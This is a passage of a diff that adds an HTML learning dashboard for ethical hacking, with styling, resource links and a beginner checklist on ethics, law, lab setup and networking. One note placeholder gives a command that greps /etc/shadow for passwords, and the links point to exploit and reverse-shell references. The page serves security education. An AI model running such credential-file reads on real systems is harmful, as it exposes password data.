@@ -1,0 +1,1656 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ethical H4cking Learning Dashboard</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha512-iecdLmaskl7CVkqkXNQ/ZH/XLlvWZOJyj7Yy7tcenmpD1ypASozpmT/E0iPtmFIB46ZmdtAc9eNBvH0H/ZpiBw==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <style>
+        /* --- Reset & Base Styles --- */
+        *, *::before, *::after {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        :root {
+            /* Calming Teal/Blue & Gray Palette - Refined */
+            --bg-color: #f8f9fa;
+            --card-bg: #ffffff;
+            --text-color: #495057;
+            --heading-color: #212529;
+            --primary-color: #17a2b8;    /* Info Blue/Teal */
+            --primary-dark: #117a8b;    /* Darker Teal */
+            --secondary-color: #6c757d;  /* Medium Gray */
+            --accent-color: #e8f6f8;     /* Very Light Teal */
+            --border-color: #dee2e6;    /* Light Gray Border */
+            --success-color: #20c997;    /* Tealish Green */
+            --success-dark: #1baa80;    /* Darker Green */
+            --success-bg-light: #e6f9f3; /* Very Light Green for completed items */
+            --progress-bg: #e9ecef;
+            --note-bg: #f8f9fa;
+            --note-border: #e0e0e0;
+            --font-family: 'Inter', sans-serif;
+            --border-radius: 10px;
+            --box-shadow: 0 5px 20px rgba(0, 0, 0, 0.07); /* Slightly more defined shadow */
+            --icon-color: var(--secondary-color);
+
+            /* -- NEW: Difficulty Tag Colors -- */
+            --difficulty-text-color: #343a40; /* Dark gray for good contrast */
+            --difficulty-beginner-bg: #b2f2bb; /* Light Mint Green */
+            --difficulty-beginner-border: #8ce99a; /* Slightly Darker Mint Green */
+            --difficulty-intermediate-bg: #ffd8a8; /* Light Pastel Orange */
+            --difficulty-intermediate-border: #ffc078; /* Slightly Darker Pastel Orange */
+            --difficulty-advanced-bg: #ffa8a8; /* Light Pastel Red */
+            --difficulty-advanced-border: #ff8787; /* Slightly Darker Pastel Red */
+        }
+
+        body {
+            font-family: var(--font-family);
+            background-color: var(--bg-color);
+            /* Optional subtle pattern */
+            /* background-image: linear-gradient(rgba(232, 246, 248, 0.1) 1px, transparent 1px), linear-gradient(90deg, rgba(232, 246, 248, 0.1) 1px, transparent 1px);
+            background-size: 20px 20px; */
+            color: var(--text-color);
+            line-height: 1.65;
+            padding: 40px 20px;
+            font-weight: 400;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+
+
+        /* --- Layout & Container --- */
+        .container {
+            max-width: 1150px;
+            margin: 0 auto;
+            padding: 0; /* Padding moved to inner elements */
+            background-color: var(--card-bg);
+            border-radius: var(--border-radius);
+            box-shadow: var(--box-shadow);
+            border: 1px solid var(--border-color);
+            overflow: hidden; /* Contain header gradient */
+        }
+
+        /* --- Header --- */
+        .header-wrapper { /* New wrapper for gradient */
+            padding: 40px 40px 35px 40px;
+            margin-bottom: 40px;
+            border-bottom: 1px solid var(--border-color);
+            background: linear-gradient(135deg, #ffffff 60%, var(--accent-color) 100%);
+        }
+        header {
+            text-align: center;
+        }
+        header h1 {
+            color: var(--heading-color);
+            margin-bottom: 15px;
+            font-size: 2.6em;
+            font-weight: 700; /* Bolder */
+        }
+        header p {
+            color: var(--text-color);
+            font-size: 1.15em;
+            opacity: 0.9;
+            max-width: 750px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        /* --- Inner Content Padding --- */
+        .main-content {
+            padding: 0 40px 40px 40px; /* Add padding here */
+        }
+
+        /* --- Quick Links --- */
+        .quick-links {
+            background-color: #fff; /* White background */
+            padding: 20px 25px;
+            margin-bottom: 40px;
+            border-radius: var(--border-radius);
+            text-align: center;
+            border: 1px solid var(--border-color);
+            border-left: 4px solid var(--primary-color); /* Accent border */
+        }
+        .quick-links h2 {
+            color: var(--heading-color);
+            font-weight: 600; /* Bolder */
+            font-size: 1.3em;
+            margin-bottom: 15px;
+        }
+        .quick-links h2 i {
+            color: var(--primary-color);
+            margin-right: 8px;
+        }
+        .quick-links a {
+            color: var(--primary-dark);
+            text-decoration: none;
+            margin: 5px 12px;
+            font-weight: 500;
+            font-size: 0.95em;
+            transition: color 0.2s ease, transform 0.2s ease;
+            display: inline-block;
+        }
+        .quick-links a:hover {
+            color: var(--primary-color);
+            text-decoration: underline;
+            transform: translateY(-2px);
+        }
+        .quick-links a i {
+            margin-right: 6px;
+            opacity: 0.7;
+            transition: color 0.2s ease;
+        }
+         .quick-links a:hover i {
+             color: var(--primary-color);
+         }
+
+        /* --- Overall Progress --- */
+        .overall-progress {
+            background-color: #f8f9fa;
+            padding: 30px;
+            margin-bottom: 40px;
+            border-radius: var(--border-radius);
+            border: 1px solid var(--border-color);
+        }
+        .overall-progress h2 {
+            color: var(--heading-color);
+            margin-bottom: 20px;
+            text-align: center;
+            font-weight: 600; /* Bolder */
+            font-size: 1.8em;
+        }
+        .progress-bar-container {
+            background-color: var(--progress-bg);
+            border-radius: 50px;
+            height: 22px; /* Slightly taller for better gradient */
+            overflow: hidden;
+            margin-bottom: 12px;
+            border: 1px solid #ced4da;
+            box-shadow: inset 0 1px 3px rgba(0,0,0,0.1); /* Inset shadow */
+        }
+        .progress-bar {
+            /* Gradient Fill */
+            background: linear-gradient(to right, var(--primary-dark), var(--primary-color));
+            height: 100%;
+            width: 0%; /* Updated by JS */
+            border-radius: 50px;
+            transition: width 0.6s ease-in-out;
+            text-align: center;
+            color: white;
+            font-weight: 600;
+            line-height: 22px;
+            font-size: 0.85em;
+            text-shadow: 1px 1px 1px rgba(0,0,0,0.2);
+        }
+        .progress-text {
+            text-align: center;
+            font-weight: 500;
+            color: var(--secondary-color);
+        }
+
+        /* --- Modules --- */
+        .module {
+            background-color: var(--card-bg);
+            margin-bottom: 30px;
+            border-radius: var(--border-radius);
+            box-shadow: 0 3px 10px rgba(0, 0, 0, 0.06); /* Refined shadow */
+            border: 1px solid var(--border-color);
+            border-left: 4px solid var(--secondary-color); /* Default accent border */
+            overflow: hidden;
+            transition: border-left-color 0.3s ease;
+        }
+        .module.open {
+             border-left-color: var(--primary-color); /* Active border color */
+        }
+
+        .module-header {
+            background-color: transparent;
+            padding: 18px 25px; /* Reduced slightly */
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            cursor: pointer;
+            border-bottom: 1px solid var(--border-color);
+            transition: background-color 0.2s ease;
+        }
+        .module-header:hover {
+             background-color: var(--accent-color);
+        }
+        .module-header h3 {
+            color: var(--heading-color);
+            font-size: 1.4em;
+            font-weight: 600;
+            margin-right: auto;
+            padding-right: 20px;
+        }
+         .module-stats .progress-text {
+            font-size: 0.9em;
+            color: var(--secondary-color);
+            font-weight: 500;
+            margin-right: 15px;
+            white-space: nowrap;
+            background-color: var(--progress-bg);
+            padding: 3px 10px;
+            border-radius: 15px;
+            border: 1px solid #ced4da;
+         }
+        .module-toggle {
+            font-size: 1em;
+            color: var(--secondary-color);
+            transition: transform 0.3s ease, color 0.3s ease;
+            width: 30px;
+            text-align: center;
+            flex-shrink: 0;
+        }
+        .module-header:hover .module-toggle {
+            color: var(--primary-dark);
+        }
+        .module-toggle::before { content: "\f078"; font-family: "Font Awesome 6 Free"; font-weight: 900; }
+        .module.open .module-toggle::before { content: "\f077"; }
+
+        .module-content {
+            max-height: 0;
+            overflow: hidden;
+            transition: max-height 0.4s ease-out, padding 0.4s ease-out, border-top-color 0.4s ease-out;
+            padding: 0 25px; /* Only horizontal padding initially */
+            border-top: 1px solid transparent; /* Prepare for border transition */
+        }
+        .module.open .module-content {
+            display: block;
+            max-height: 4000px; /* Allow very large content */
+            padding: 25px 25px 25px 25px;
+            border-top-color: var(--border-color); /* Show border when open */
+            transition: max-height 0.5s ease-in-out, padding 0.5s ease-in-out, border-top-color 0.5s ease-in-out;
+        }
+        .module-progress { margin-bottom: 25px; }
+        .module-progress .progress-text { font-size: 1em; text-align: left; margin-bottom: 10px; color: var(--heading-color); font-weight: 500; }
+
+        /* --- Checklist --- */
+        .checklist { list-style: none; padding-left: 0; }
+        .checklist li {
+            margin-bottom: 15px; /* Slightly reduced margin */
+            padding: 15px 20px;
+            border: 1px solid var(--border-color);
+            border-left: 4px solid var(--border-color); /* Default left border */
+            border-radius: 8px;
+            background-color: #fff;
+            transition: all 0.3s ease; /* Smooth transition for background, border, opacity */
+            position: relative; /* For potential future pseudo-elements */
+        }
+         .checklist li:hover {
+             background-color: #fdfdfd;
+             border-color: #c4cbd1;
+             box-shadow: 0 3px 8px rgba(0, 0, 0, 0.05);
+             transform: translateY(-2px);
+         }
+        /* --- Completed State --- */
+        .checklist li.completed {
+            background-color: var(--success-bg-light);
+            border-color: var(--success-dark);
+            border-left-color: var(--success-color);
+            opacity: 0.85; /* Slightly fade out completed items */
+        }
+        .checklist li.completed:hover {
+             opacity: 1; /* Bring back full opacity on hover */
+             box-shadow: 0 3px 8px rgba(32, 201, 151, 0.1);
+             border-color: var(--success-dark);
+        }
+
+        .checklist .item-header {
+            display: flex;
+            align-items: flex-start;
+            margin-bottom: 10px;
+            flex-wrap: wrap; /* Ensure wrapping */
+            gap: 10px; /* Add gap between label and tag */
+        }
+        .checklist label {
+            display: flex;
+            align-items: flex-start;
+            cursor: pointer;
+            flex-grow: 1;
+            /* Removed margin-right, using gap in parent */
+            min-width: 60%; /* Prevent title from becoming too narrow */
+        }
+        .checklist input[type="checkbox"] {
+            appearance: none; -webkit-appearance: none;
+            background-color: #fff;
+            border: 2px solid var(--secondary-color);
+            border-radius: 4px;
+            width: 18px; height: 18px;
+            margin-right: 12px;
+            cursor: pointer;
+            position: relative;
+            top: 3px; /* Fine-tune alignment */
+            transition: all 0.2s ease;
+            flex-shrink: 0;
+        }
+        .checklist input[type="checkbox"]:checked {
+            background-color: var(--success-color);
+            border-color: var(--success-dark);
+        }
+        .checklist input[type="checkbox"]::after {
+            content: '\f00c'; font-family: "Font Awesome 6 Free";
+            font-weight: 900; /* Bolder check */
+            font-size: 11px; /* Slightly larger check */
+            color: white;
+            position: absolute;
+            left: 50%; top: 50%;
+            transform: translate(-50%, -50%);
+            opacity: 0;
+            transition: opacity 0.2s ease;
+        }
+        .checklist input[type="checkbox"]:checked::after { opacity: 1; }
+
+        .checklist label span.item-title {
+            flex-grow: 1;
+            color: var(--heading-color);
+            font-weight: 500;
+            line-height: 1.5;
+            transition: color 0.3s, opacity 0.3s;
+        }
+        .checklist li.completed label span.item-title {
+             color: var(--secondary-color); /* Keep readable but distinct */
+             /* text-decoration: line-through; */ /* Optional */
+        }
+
+        /* --- Difficulty Tag --- */
+        /* -- UPDATED Difficulty Tag Styles -- */
+        .difficulty-tag {
+            font-size: 0.75em; /* Slightly smaller */
+            font-weight: 600;
+            padding: 3px 10px; /* Adjusted padding */
+            border-radius: 15px;
+            white-space: nowrap;
+            margin-top: 4px; /* Align better with first line of title */
+            flex-shrink: 0; /* Prevent shrinking */
+            color: var(--difficulty-text-color); /* Use variable for text color */
+            border: 1px solid transparent; /* Base border, color set below */
+            text-transform: uppercase; /* Standard tag look */
+            letter-spacing: 0.5px; /* Slight spacing */
+            line-height: 1.4; /* Ensure text fits vertically */
+            display: inline-block; /* Ensure proper layout */
+        }
+
+        .difficulty-beginner {
+            background-color: var(--difficulty-beginner-bg);
+            border-color: var(--difficulty-beginner-border);
+        }
+
+        .difficulty-intermediate {
+            background-color: var(--difficulty-intermediate-bg);
+            border-color: var(--difficulty-intermediate-border);
+        }
+
+        .difficulty-advanced {
+            background-color: var(--difficulty-advanced-bg);
+            border-color: var(--difficulty-advanced-border);
+        }
+        /* -- END UPDATED Difficulty Tag Styles -- */
+
+
+        /* --- Item Details --- */
+        .item-details {
+            margin-left: 30px;
+            margin-top: 8px; /* Increased space */
+            padding-left: 12px; /* Increased padding */
+            border-left: 3px solid var(--accent-color); /* Lighter accent border */
+            transition: border-left-color 0.3s ease;
+        }
+        .checklist li.completed .item-details {
+            border-left-color: var(--success-color); /* Match left border on complete */
+        }
+
+        .topic-description {
+            font-size: 0.92em;
+            color: var(--text-color);
+            opacity: 0.9;
+            margin-bottom: 14px;
+        }
+        .item-links { font-size: 0.88em; margin-bottom: 14px; }
+        .item-links div { margin-bottom: 8px; display: flex; align-items: center; }
+        .item-links i {
+            color: var(--icon-color);
+            margin-right: 10px; /* More space */
+            width: 16px;
+            text-align: center;
+            flex-shrink: 0;
+            opacity: 0.8; /* Slightly faded icon */
+        }
+        .item-links a { color: var(--primary-dark); text-decoration: none; word-break: break-all; }
+        .item-links a:hover { text-decoration: underline; color: var(--primary-color); }
+        .item-links span.placeholder { opacity: 0.6; font-style: italic; }
+
+        .item-notes textarea {
+            width: 100%;
+            min-height: 60px;
+            font-family: inherit; font-size: 0.9em;
+            padding: 10px 12px;
+            border: 1px solid var(--note-border);
+            border-radius: 6px;
+            background-color: var(--note-bg);
+            resize: vertical;
+            color: var(--text-color);
+            margin-top: 8px;
+            transition: border-color 0.2s ease, box-shadow 0.2s ease;
+        }
+        .item-notes textarea:focus {
+            outline: none;
+            border-color: var(--primary-color);
+            box-shadow: 0 0 0 3px rgba(23, 162, 184, 0.15); /* Softer focus ring */
+            background-color: #fff;
+        }
+
+        /* --- Disclaimer --- */
+        .disclaimer {
+            text-align: center;
+            margin-top: 50px;
+            padding: 25px;
+            background-color: #fff;
+            border-radius: var(--border-radius);
+            border: 1px solid var(--border-color);
+            border-left: 5px solid var(--primary-color);
+            color: var(--text-color);
+            font-size: 0.95em;
+            box-shadow: var(--box-shadow);
+        }
+        .disclaimer strong { display: block; margin-bottom: 10px; font-size: 1.15em; color: var(--heading-color); font-weight: 600; }
+        .disclaimer strong i { margin-right: 8px; color: var(--primary-color); }
+
+        /* --- Responsive Design --- */
+        @media (max-width: 992px) {
+             .main-content { padding: 0 30px 30px 30px; }
+             .header-wrapper { padding: 30px 30px 25px 30px; }
+        }
+        @media (max-width: 768px) {
+            body { padding: 25px 15px; }
+            .container { padding: 0; }
+             .main-content { padding: 0 20px 20px 20px; }
+             .header-wrapper { padding: 25px 20px 20px 20px; }
+            header h1 { font-size: 2.1em; }
+            .module-header h3 { font-size: 1.3em; }
+            .item-details { margin-left: 28px; padding-left: 10px;}
+            .quick-links a { margin: 5px 8px; }
+            .overall-progress h2 { font-size: 1.6em; }
+        }
+        @media (max-width: 480px) {
+             body { padding: 20px 10px; }
+             .main-content { padding: 0 15px 15px 15px; }
+             .header-wrapper { padding: 20px 15px 15px 15px; }
+             header h1 { font-size: 1.8em; }
+             header p { font-size: 1em; }
+             .module-header { padding: 15px 18px; }
+             .module-header h3 { font-size: 1.15em; padding-right: 10px; }
+             .module-stats .progress-text { font-size: 0.8em; padding: 2px 8px;}
+             .module-content { padding: 20px 15px; }
+             .checklist li { padding: 12px 15px; }
+             .checklist label span.item-title { font-size: 0.95em; }
+             /* Adjust tag size on small screens if needed */
+             .difficulty-tag { font-size: 0.7em; padding: 2px 8px; }
+             .topic-description { font-size: 0.9em; }
+             .item-links { font-size: 0.85em;}
+             .item-details { margin-left: 26px; padding-left: 8px;}
+             .quick-links a { margin: 3px 5px; font-size: 0.9em;}
+             .disclaimer { padding: 20px; margin: 30px 15px 0 15px; width: auto; }
+             .disclaimer strong { font-size: 1.1em; }
+        }
+
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="header-wrapper">
+            <header>
+                <h1>H4cking Learning Dashboard</h1>
+                <p>Track your progress, organize notes, and access key resources on your cybersecurity journey. Remember to always act legally and ethically.</p>
+            </header>
+        </div>
+
+        <div class="main-content">
+            <section class="quick-links">
+                 <h2><i class="fa-solid fa-link"></i> Quick Links</h2>
+                 <a href="https://owasp.org/www-project-top-ten/" target="_blank" rel="noopener noreferrer"><i class="fa-solid fa-shield-halved"></i> OWASP Top 10</a>
+                 <a href="https://www.exploit-db.com/" target="_blank" rel="noopener noreferrer"><i class="fa-solid fa-database"></i> Exploit-DB</a>
+                 <a href="https://tryhackme.com/" target="_blank" rel="noopener noreferrer"><i class="fa-solid fa-terminal"></i> TryHackMe</a>
+                 <a href="https://www.hackthebox.com/" target="_blank" rel="noopener noreferrer"><i class="fa-solid fa-box"></i> Hack The Box</a>
+                 <a href="https://gtfobins.github.io/" target="_blank" rel="noopener noreferrer"><i class="fa-solid fa-person-hiking"></i> GTFOBins</a>
+                 <a href="https://book.hacktricks.xyz/" target="_blank" rel="noopener noreferrer"><i class="fa-solid fa-book-skull"></i> HackTricks</a>
+                 <a href="https://github.com/swisskyrepo/PayloadsAllTheThings" target="_blank" rel="noopener noreferrer"><i class="fa-solid fa-scroll"></i> PayloadsAllTheThings</a>
+                 <a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" target="_blank" rel="noopener noreferrer"><i class="fa-solid fa-terminal"></i> Reverse Shells</a>
+            </section>
+
+            <section class="overall-progress">
+                <h2>Overall Progress</h2>
+                <div class="progress-bar-container">
+                    <div class="progress-bar" id="overall-progress-bar">0%</div>
+                </div>
+                <div class="progress-text" id="overall-progress-text">Completed 0 / X items</div>
+            </section>
+
+            <!-- Syllabus Modules Start Here (ALL Updated) -->
+            <!-- Modules 0 - 7 HTML structure remains largely the same as previous version -->
+            <!-- Ensure all <li> elements have the correct structure -->
+
+            <section class="module" data-module-id="module-0">
+                <div class="module-header">
+                    <h3>Module 0: Foundations & Ethics</h3>
+                    <div class="module-stats"> <span class="progress-text">0 / 10</span> </div>
+                    <span class="module-toggle"></span>
+                </div>
+                <div class="module-content">
+                    <div class="module-progress"> <div class="progress-text">Module Progress:</div> <div class="progress-bar-container"> <div class="progress-bar">0%</div> </div> </div>
+                    <ul class="checklist">
+                        <li>
+                            <div class="item-header">
+                                <label><input type="checkbox" data-id="m0-item0"><span class="item-title">Define Ethical Hacking & Penetration Testing</span></label>
+                                <span class="difficulty-tag difficulty-beginner">Beginner</span>
+                            </div>
+                            <div class="item-details">
+                                <p class="topic-description">Understand scopes, rules of engagement (RoE), methodologies (black-box, white-box, gray-box), and the goals of security assessments.</p>
+                                <div class="item-links">
+                                    <div><i class="fa-solid fa-book"></i> <a href="https://www.eccouncil.org/ethical-hacking/" target="_blank" rel="noopener noreferrer">EC-Council Overview</a></div>
+                                    <div><i class="fa-solid fa-book"></i> <a href="https://owasp.org/www-project-penetration-testing-methodologies/" target="_blank" rel="noopener noreferrer">OWASP Testing Methodologies</a></div>
+                                    <div><i class="fa-solid fa-crosshairs"></i> <span class="placeholder">Conceptual / Reading</span></div>
+                                </div>
+                                <div class="item-notes"><textarea data-note-id="m0-item0-note" placeholder="Key differences, importance of written permission, common phases (recon, scan, exploit, post-ex, report)..."></textarea></div>
+                            </div>
+                        </li>
+                        <li>
+                            <div class="item-header">
+                                 <label><input type="checkbox" data-id="m0-item1"><span class="item-title">Legal Frameworks & Compliance</span></label>
+                                <span class="difficulty-tag difficulty-beginner">Beginner</span>
+                            </div>
+                            <div class="item-details">
+                                <p class="topic-description">Awareness of major laws (CFAA, DMCA in US), GDPR (EU), local regulations, and industry standards (PCI-DSS, HIPAA).</p>
+                                <div class="item-links">
+                                    <div><i class="fa-solid fa-gavel"></i> <a href="https://www.eff.org/issues/cfaa" target="_blank" rel="noopener noreferrer">EFF on CFAA</a></div>
+                                    <div><i class="fa-solid fa-gavel"></i> <a href="https://gdpr-info.eu/" target="_blank" rel="noopener noreferrer">GDPR Text</a></div>
+                                    <div><i class="fa-solid fa-crosshairs"></i> <span class="placeholder">Conceptual / Reading</span></div>
+                                </div>
+                                <div class="item-notes"><textarea data-note-id="m0-item1-note" placeholder="Focus: Unauthorized access is illegal. Understand consequences. Research laws in your specific region."></textarea></div>
+                            </div>
+                        </li>
+                        <li>
+                            <div class="item-header">
+                                 <label><input type="checkbox" data-id="m0-item2"><span class="item-title">Setting up a Virtual Lab Environment</span></label>
+                                 <span class="difficulty-tag difficulty-beginner">Beginner</span>
+                            </div>
+                            <div class="item-details">
+                                <p class="topic-description">Install virtualization software (VirtualBox/VMware), deploy Kali Linux (attacker VM), and vulnerable target VMs (e.g., Metasploitable, OWASP Juice Shop, specific VulnHub machines).</p>
+                                 <div class="item-links">
+                                    <div><i class="fa-brands fa-linux"></i> <a href="https://www.kali.org/docs/virtualization/install-virtualbox-guest-vm/" target="_blank" rel="noopener noreferrer">Kali VM Guide</a></div>
+                                    <div><i class="fa-solid fa-download"></i> <a href="https://www.vulnhub.com/" target="_blank" rel="noopener noreferrer">VulnHub VMs</a></div>
+                                    <div><i class="fa-solid fa-crosshairs"></i> <a href="https://tryhackme.com/room/introtovirtualization" target="_blank" rel="noopener noreferrer">THM: Intro to Virtualization</a></div>
+                                </div>
+                                <div class="item-notes"><textarea data-note-id="m0-item2-note" placeholder="VirtualBox setup, network modes (NAT, Host-only), snapshotting VMs, Kali default creds (kali/kali), updating Kali (`sudo apt update && sudo apt full-upgrade -y`)..."></textarea></div>
+                            </div>
+                        </li>
+                        <li>
+                            <div class="item-header">
+                                 <label><input type="checkbox" data-id="m0-item3"><span class="item-title">Essential Linux Command Line</span></label>
+                                 <span class="difficulty-tag difficulty-beginner">Beginner</span>
+                            </div>
+                            <div class="item-details">
+                                <p class="topic-description">File system navigation (`cd`, `ls`, `pwd`), file operations (`cp`, `mv`, `rm`, `touch`, `mkdir`, `cat`, `less`), permissions (`chmod`, `chown`), searching (`grep`, `find`), networking (`ip addr`, `ping`), process management (`ps`, `kill`).</p>
+                                 <div class="item-links">
+                                    <div><i class="fa-solid fa-book"></i> <a href="https://linuxjourney.com/" target="_blank" rel="noopener noreferrer">Linux Journey</a></div>
+                                    <div><i class="fa-solid fa-terminal"></i> <a href="https://cmdchallenge.com/" target="_blank" rel="noopener noreferrer">CMD Challenge</a></div>
+                                    <div><i class="fa-solid fa-crosshairs"></i> <a href="https://tryhackme.com/room/linuxfundamentals" target="_blank" rel="noopener noreferrer">THM: Linux Fundamentals Series</a></div>
+                                </div>
+                                 <div class="item-notes"><textarea data-note-id="m0-item3-note" placeholder="`ls -la`, `cd ..`, `grep 'password' /etc/shadow`, `find / -name config.php`, `chmod +x script.sh`, `ps aux | grep apache`..."></textarea></div>
+                            </div>
+                        </li>
+                          <li>
+                            <div class="item-header">
+                                 <label><input type="checkbox" data-id="m0-item4"><span class="item-title">Essential Windows Command Line</span></label>
+                                 <span class="difficulty-tag difficulty-beginner">Beginner</span>
+                            </div>
+                            <div class="item-details">
+                                <p class="topic-description">Networking (`ipconfig`, `ping`, `netstat`), system info (`systeminfo`), process management (`tasklist`, `taskkill`), file operations (`dir`, `copy`, `del`, `move`, `type`), user management (`net user`). PowerShell basics (`Get-Process`, `Get-NetIPAddress`).</p>
+                                <div class="item-links">
+                                    <div><i class="fa-solid fa-book"></i> <a href="https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/windows-commands" target="_blank" rel="noopener noreferrer">MS Command Reference</a></div>
+                                    <div><i class="fa-brands fa-powershell"></i> <a href="https://learn.microsoft.com/en-us/powershell/scripting/learn/ps101/01-getting-started?view=powershell-7.4" target="_blank" rel="noopener noreferrer">PowerShell Basics</a></div>
+                                    <div><i class="fa-solid fa-crosshairs"></i> <a href="https://tryhackme.com/room/windowsfundamentals1xbx" target="_blank" rel="noopener noreferrer">THM: Windows Fundamentals</a></div>
+                                </div>
+                                 <div class="item-notes"><textarea data-note-id="m0-item4-note" placeholder="`ipconfig /all`, `netstat -ano`, `tasklist /svc`, `net user`, `dir C:\Users`, `type C:\windows\system32\drivers\etc\hosts`, `powershell Get-LocalUser`..."></textarea></div>
+                            </div>
+                        </li>
+                         <li>
+                            <div class="item-header">
+                                 <label><input type="checkbox" data-id="m0-item5"><span class="item-title">Networking Fundamentals: OSI & TCP/IP Models</span></label>
+                                 <span class="difficulty-tag difficulty-beginner">Beginner</span>
+                            </div>
+                            <div class="item-details">
+                                <p class="topic-description">Understand the layers (Physical, Data Link, Network, Transport, Session, Presentation, Application for OSI; Network Interface, Internet, Transport, Application for TCP/IP) and their core functions.</p>
+                                 <div class="item-links">
+                                    <div><i class="fa-solid fa-diagram-project"></i> <a href="https://www.cloudflare.com/learning/ddos/glossary/osi-model/" target="_blank" rel="noopener noreferrer">Cloudflare OSI Model</a></div>
+                                    <div><i class="fa-solid fa-diagram-project"></i> <a href="https://www.geeksforgeeks.org/tcp-ip-model/" target="_blank" rel="noopener noreferrer">GeeksForGeeks TCP/IP</a></div>
+                                    <div><i class="fa-solid fa-crosshairs"></i> <a href="https://tryhackme.com/room/introtonetworking" target="_blank" rel="noopener noreferrer">THM: Intro to Networking</a></div>
+                                </div>
+                                <div class="item-notes"><textarea data-note-id="m0-item5-note" placeholder="Layer 7 (App) - HTTP/DNS, L4 (Transport) - TCP/UDP, L3 (Network) - IP/ICMP, L2 (Data Link) - MAC Addr/Ethernet..."></textarea></div>
+                            </div>
+                        </li>
+                         <li>
+                            <div class="item-header">
+                                 <label><input type="checkbox" data-id="m0-item6"><span class="item-title">Common Protocols & Ports</span></label>
+                                 <span class="difficulty-tag difficulty-beginner">Beginner</span>
+                            </div>
+                            <div class="item-details">
+                                <p class="topic-description">Understand the purpose and default ports of key protocols: IP, TCP, UDP, ICMP, HTTP(S), DNS, DHCP, SMTP, POP3, IMAP, FTP, SSH, Telnet, SMB, NFS, RDP.</p>
+                                <div class="item-links">
+                                    <div><i class="fa-solid fa-list-ol"></i> <a href="https://en.wikipedia.org/wiki/List_of_TCP_and_UDP_port_numbers" target="_blank" rel="noopener noreferrer">Common Ports List</a></div>
+                                    <div><i class="fa-solid fa-crosshairs"></i> <a href="https://tryhackme.com/room/protocolsandports" target="_blank" rel="noopener noreferrer">THM: Protocols and Ports</a></div>
+                                </div>
+                                <div class="item-notes"><textarea data-note-id="m0-item6-note" placeholder="TCP vs UDP (connection-oriented vs connectionless). HTTP 80, HTTPS 443, DNS 53 (UDP/TCP), SSH 22, FTP 21, SMB 445, RDP 3389..."></textarea></div>
+                            </div>
+                        </li>
+                         <li>
+                            <div class="item-header">
+                                 <label><input type="checkbox" data-id="m0-item7"><span class="item-title">IP Addressing & Subnetting Basics</span></label>
+                                 <span class="difficulty-tag difficulty-intermediate">Intermediate</span>
+                            </div>
+                            <div class="item-details">
+                                <p class="topic-description">IPv4 addresses, classes (A, B, C), private vs public IP ranges (RFC 1918), CIDR notation, calculating network/broadcast addresses and usable hosts.</p>
+                                <div class="item-links">
+                                    <div><i class="fa-solid fa-calculator"></i> <a href="https://www.calculator.net/ip-subnet-calculator.html" target="_blank" rel="noopener noreferrer">Subnet Calculator</a></div>
+                                    <div><i class="fa-solid fa-book"></i> <a href="https://www.practicalnetworking.net/series/subnetting/subnetting/" target="_blank" rel="noopener noreferrer">Practical Networking Guide</a></div>
+                                    <div><i class="fa-solid fa-crosshairs"></i> <a href="https://tryhackme.com/room/subnettingrumble" target="_blank" rel="noopener noreferrer">THM: Subnetting Rumble</a></div>
+                                </div>
+                                <div class="item-notes"><textarea data-note-id="m0-item7-note" placeholder="Private: 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16. /24 = 255.255.255.0 (254 hosts), /30 = 255.255.255.252 (2 hosts)..."></textarea></div>
+                            </div>
+                        </li>
+                         <li>
+                            <div class="item-header">
+                                 <label><input type="checkbox" data-id="m0-item8"><span class="item-title">Introduction to Wireshark</span></label>
+                                 <span class="difficulty-tag difficulty-intermediate">Intermediate</span>
+                            </div>
+                            <div class="item-details">
+                                <p class="topic-description">Capturing packets, basic interface navigation, display filters (ip.addr, tcp.port, http), following TCP streams, understanding packet details.</p>
+                                <div class="item-links">
+                                    <div><i class="fa-solid fa-file-waveform"></i> <a href="https://www.wireshark.org/docs/" target="_blank" rel="noopener noreferrer">Wireshark Documentation</a></div>
+                                    <div><i class="fa-solid fa-video"></i> <a href="https://www.youtube.com/watch?v=TkCSr30UojM" target="_blank" rel="noopener noreferrer">Intro Video Example</a></div>
+                                    <div><i class="fa-solid fa-crosshairs"></i> <a href="https://tryhackme.com/room/wiresharkthebasics" target="_blank" rel="noopener noreferrer">THM: Wireshark Basics</a></div>
+                                </div>
+                                <div class="item-notes"><textarea data-note-id="m0-item8-note" placeholder="Capture on specific interface. Filters: `ip.addr == 1.2.3.4`, `tcp.port == 80`, `http.request.method == POST`. Right-click -> Follow -> TCP Stream."></textarea></div>
+                            </div>
+                        </li>
+                         <li>
+                            <div class="item-header">
+                                 <label><input type="checkbox" data-id="m0-item9"><span class="item-title">Programming/Scripting Fundamentals (Python Recommended)</span></label>
+                                 <span class="difficulty-tag difficulty-intermediate">Intermediate</span>
+                            </div>
+                            <div class="item-details">
+                                <p class="topic-description">Basic syntax, variables, data types (strings, integers, lists, dictionaries), loops (`for`, `while`), conditional statements (`if/else`), functions, file I/O, using basic libraries (`requests` for HTTP, `socket` for networking).</p>
+                                <div class="item-links">
+                                    <div><i class="fa-brands fa-python"></i> <a href="https://automatetheboringstuff.com/" target="_blank" rel="noopener noreferrer">Automate the Boring Stuff (Book)</a></div>
+                                    <div><i class="fa-brands fa-python"></i> <a href="https://docs.python.org/3/tutorial/" target="_blank" rel="noopener noreferrer">Official Python Tutorial</a></div>
+                                    <div><i class="fa-solid fa-crosshairs"></i> <a href="https://tryhackme.com/room/pythonbasics" target="_blank" rel="noopener noreferrer">THM: Python Basics</a></div>
+                                </div>
